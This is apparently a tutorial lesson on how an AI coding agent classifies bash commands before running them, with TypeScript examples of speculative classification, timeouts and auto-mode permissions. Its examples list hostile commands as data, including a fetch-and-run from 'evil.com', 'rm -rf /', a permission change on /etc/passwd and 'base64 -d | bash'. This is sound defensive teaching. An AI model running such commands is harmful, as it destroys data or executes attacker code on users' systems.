# Lesson 83: Bash Command Classification

## The Most Dangerous Tool

Among all the tools an AI agent wields, `bash` is uniquely dangerous. A file write tool can overwrite one file. A bash command can do literally anything — delete filesystems, install malware, exfiltrate data, launch network attacks, modify system configuration. The bash tool is an escape hatch from the controlled tool ecosystem into the unrestricted operating system.

This is why Claude Code applies an extra layer of scrutiny to bash commands: an AI classifier that evaluates commands before execution.

## The Classification Problem

The challenge: given a bash command string, determine whether it's safe to execute without asking the user. This isn't a simple allowlist/denylist problem:

```bash
# Clearly safe
ls -la
git status
npm test

# Clearly dangerous
rm -rf /
curl http://evil.com/steal.sh | bash
sudo chmod 777 /etc/passwd

# Ambiguous — context matters
npm install express           # Usually safe, but adds a dependency
git push origin main          # Safe? Depends on the workflow
curl http://api.example.com   # Fetching data? Exfiltrating secrets?
python script.py              # What does script.py do?
```

A static pattern matcher catches the obvious cases. The AI classifier handles the ambiguous ones.

## Speculative Classification: Racing the Clock

Here's the clever part: classification takes time (it's an API call to a model). If we wait for classification before showing the user anything, the UX feels sluggish. Claude Code solves this with **speculative classification** — starting the classification early, before the permission check actually needs the result.

```typescript
interface SpeculativeClassifierResult {
  classification: "safe" | "unsafe" | "unknown";
  confidence: number;
  reasoning: string;
  completedAt: number;
}

let speculativeResult: Promise<SpeculativeClassifierResult> | null = null;

function startSpeculativeClassifierCheck(
  command: string,
  context: ClassifierContext
): void {
  speculativeResult = classifyBashCommand(command, context);
}
```

The speculative check starts as soon as the model produces a bash tool_use block — before the agent loop even gets to the permission check:

```typescript
async function* processModelResponse(
  response: ModelResponse,
  context: AgentContext
): AsyncGenerator<Message> {
  for (const block of response.content) {
    if (block.type === "tool_use" && block.name === "bash") {
      // Start classification immediately — don't wait
      startSpeculativeClassifierCheck(
        block.input.command,
        context.classifierContext
      );
    }

    // ... continue processing other blocks
    // By the time we reach the permission check,
    // classification may already be done
  }
}
```

## Racing Classification Against a Timeout

The system doesn't wait forever for classification. It races the classifier against a 2-second timeout:

```typescript
const CLASSIFIER_TIMEOUT_MS = 2000;

async function consumeSpeculativeClassifierCheck(): Promise<
  SpeculativeClassifierResult | null
> {
  if (!speculativeResult) return null;

  const result = speculativeResult;
  speculativeResult = null; // Consume it (one-time use)

  try {
    return await Promise.race([
      result,
      timeout(CLASSIFIER_TIMEOUT_MS).then(() => null),
    ]);
  } catch {
    return null; // Classification failed — treat as unknown
  }
}

function timeout(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
```

Three possible outcomes of the race:

1. **Classifier finishes quickly with high confidence** → Use the result
2. **Classifier finishes but with low confidence** → Fall back to asking the user
3. **Timeout wins** → Fall back to asking the user

```typescript
async function handleBashPermission(
  command: string,
  context: PermissionContext
): Promise<PermissionResult> {
  const classifierResult = await consumeSpeculativeClassifierCheck();

  if (classifierResult === null) {
    // Timeout or error — ask the user
    return { behavior: "ask" };
  }

  if (
    classifierResult.classification === "safe" &&
    classifierResult.confidence > 0.95
  ) {
    // High confidence safe → auto-allow
    return { behavior: "allow" };
  }

  if (classifierResult.classification === "unsafe") {
    // Classified as unsafe — in auto mode, still ask rather than deny
    // because the classifier might be wrong
    return { behavior: "ask" };
  }

  // Low confidence or unknown → ask
  return { behavior: "ask" };
}
```

## The Classifier Itself

The classifier uses a smaller, faster model to evaluate bash commands. It receives the command and surrounding context:

```typescript
async function classifyBashCommand(
  command: string,
  context: ClassifierContext
): Promise<SpeculativeClassifierResult> {
  const prompt = buildClassifierPrompt(command, context);

  const response = await callClassifierModel({
    model: "claude-haiku", // Fast, cheap model for classification
    maxTokens: 200,
    messages: [{ role: "user", content: prompt }],
  });

  return parseClassifierResponse(response);
}

function buildClassifierPrompt(
  command: string,
  context: ClassifierContext
): string {
  return `Classify this bash command as "safe" or "unsafe" for an AI coding agent to execute autonomously.

Command: ${command}

Project directory: ${context.projectDir}
Recent commands: ${context.recentCommands.join(", ")}

Classification criteria:
- "safe": Read-only operations, standard dev commands (test, build, lint), git read operations, file listing
- "unsafe": Destructive operations (rm, format), network operations (curl, wget), package installation, system modification, git write operations (push, force), privilege escalation (sudo)

Respond with:
classification: safe|unsafe
confidence: 0.0-1.0
reasoning: one sentence`;
}
```

## The setClassifierApproval Flow

When the classifier result is consumed, it flows into the permission system through `setClassifierApproval`:

```typescript
type ClassifierApproval = {
  approved: boolean;
  source: "classifier" | "user" | "rule";
  confidence?: number;
};

function setClassifierApproval(
  toolUseId: string,
  approval: ClassifierApproval
): void {
  classifierApprovals.set(toolUseId, approval);
}

// Later, when the tool is about to execute:
function getApprovalForToolUse(toolUseId: string): ClassifierApproval | null {
  return classifierApprovals.get(toolUseId) || null;
}
```

This approval map links classifier decisions to specific tool_use blocks by ID, ensuring the right classification is used for the right command.

## TRANSCRIPT_CLASSIFIER and Auto Mode

In auto mode, the classifier result directly determines whether the command runs:

```typescript
const TRANSCRIPT_CLASSIFIER = "transcript_classifier";

async function handleAutoModeBash(
  command: string,
  toolUseId: string,
  context: PermissionContext
): Promise<PermissionResult> {
  // Try to get speculative result first
  const speculative = await consumeSpeculativeClassifierCheck();

  if (speculative && speculative.confidence > 0.95) {
    setClassifierApproval(toolUseId, {
      approved: speculative.classification === "safe",
      source: TRANSCRIPT_CLASSIFIER,
      confidence: speculative.confidence,
    });

    if (speculative.classification === "safe") {
      return { behavior: "allow" };
    }
  }

  // No speculative result or low confidence — run fresh classification
  const freshResult = await classifyBashCommand(command, context);

  setClassifierApproval(toolUseId, {
    approved: freshResult.classification === "safe",
    source: TRANSCRIPT_CLASSIFIER,
    confidence: freshResult.confidence,
  });

  if (
    freshResult.classification === "safe" &&
    freshResult.confidence > 0.95
  ) {
    return { behavior: "allow" };
  }

  // Even in auto mode, uncertain commands get user approval
  return { behavior: "ask" };
}
```

The key insight: auto mode isn't "allow everything." It's "allow what the classifier confidently says is safe, ask about everything else." The classifier is a filter that reduces prompts without eliminating them.

## Why Bash Needs Extra Scrutiny

To summarize why bash gets special treatment beyond the normal permission system:

**1. Unbounded capabilities.** A `write_file` tool writes one file. A bash command can chain unlimited operations with pipes, redirects, and subshells.

**2. Opaque intent.** `rm -rf $(cat targets.txt)` — the actual files deleted depend on runtime state that the permission system can't inspect statically.

**3. Side effects cascade.** `npm install malicious-package` can execute arbitrary code in install scripts, which can modify the filesystem, network, and system.

**4. Irreversible damage.** Many bash operations (delete, overwrite, send network data) cannot be undone.

**5. Privilege escalation.** Bash is the path to `sudo`, `chmod`, and other privilege-escalating operations.

```typescript
// This is why the permission pipeline for bash has extra layers:
async function checkBashPermission(
  command: string,
  context: PermissionContext
): Promise<PermissionResult> {
  // Layer 1: Hard deny rules (pattern matching)
  const denyCheck = checkDenyRules("bash", { command }, context);
  if (denyCheck.behavior === "deny") return denyCheck;

  // Layer 2: Hard allow rules (pattern matching)
  const allowCheck = checkAllowRules("bash", { command }, context);
  if (allowCheck.behavior === "allow") return allowCheck;

  // Layer 3: AI classification (unique to bash)
  if (context.permissionMode === "auto") {
    return await handleAutoModeBash(command, context.toolUseId, context);
  }

  // Layer 4: Ask the user (default mode)
  return { behavior: "ask" };
}
```

## Summary

Bash command classification is an AI-powered safety layer that sits on top of the standard permission system. Speculative classification starts early to minimize latency. The classifier races against a timeout to maintain responsiveness. In auto mode, high-confidence safe commands proceed automatically while uncertain commands still prompt the user. This creates a smooth experience without sacrificing safety for the most dangerous tool in the agent's toolkit.

## Practice Exercises

> **Remember**: Try each exercise before looking at the answer. Write knowledge answers in your notebook. Code challenges go in your IDE.

### Exercise 1 — Why Bash Needs Extra Scrutiny
**Question:** List five reasons why the bash tool requires an extra classification layer beyond the standard permission system. For each reason, give a concrete example command that illustrates the danger.

[View Answer](../../answers/09-permissions-and-safety/answer-83.md#exercise-1)

### Exercise 2 — Heuristic Bash Classifier
**Challenge:** Build a `classifyBashCommand` function that uses heuristic rules (no AI model): categorize by first token, detect dangerous patterns (`rm -rf`, `sudo`, `curl | bash`), and handle pipes and chained commands (`&&`, `||`, `;`). Return `"safe" | "unsafe" | "unknown"` with a confidence score.

Write your solution in your IDE first, then check:

[View Answer](../../answers/09-permissions-and-safety/answer-83.md#exercise-2)

### Exercise 3 — Speculative Classification with Race
**Challenge:** Implement the speculative classification system: a `startSpeculativeCheck` function that begins classification early, and a `consumeSpeculativeCheck` function that races the classifier against a 2-second timeout. Return `null` if the timeout wins.

Write your solution in your IDE first, then check:

[View Answer](../../answers/09-permissions-and-safety/answer-83.md#exercise-3)

### Exercise 4 — Edge Case Command Classifier
**Challenge:** Write tests for your classifier against edge cases: empty commands, commands with variable expansion (`$HOME`, `$(whoami)`), heredocs, background processes (`&`), subshells, and encoded commands (`base64 -d | bash`). Document which cases your heuristic handles correctly and which it misses.

Write your solution in your IDE first, then check:

[View Answer](../../answers/09-permissions-and-safety/answer-83.md#exercise-4)
